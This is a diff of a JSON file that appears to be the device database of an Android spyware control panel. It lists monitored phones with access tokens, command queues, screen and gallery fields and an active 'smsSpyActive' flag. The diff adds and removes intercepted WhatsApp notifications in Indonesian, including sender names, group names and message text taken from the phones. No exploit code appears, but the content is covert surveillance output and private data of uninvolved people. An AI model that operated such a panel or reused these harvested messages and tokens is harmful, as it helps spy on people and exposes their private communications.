@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777175808206,
+    "lastSeen": 1777175817360,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎131 pesan dari 3 chat",
+        "time": "26/04 12:07",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777175817987
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "26/04 11:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173094244
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (33 pesan): ~ idihh caperr amat bangg",
-        "content": "5 pet g guna dapet berapa seclesh",
-        "time": "26/04 11:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173094179
       }
     ],
     "galleryPhotos": [],
@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777175807341,
+    "lastSeen": 1777175816024,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
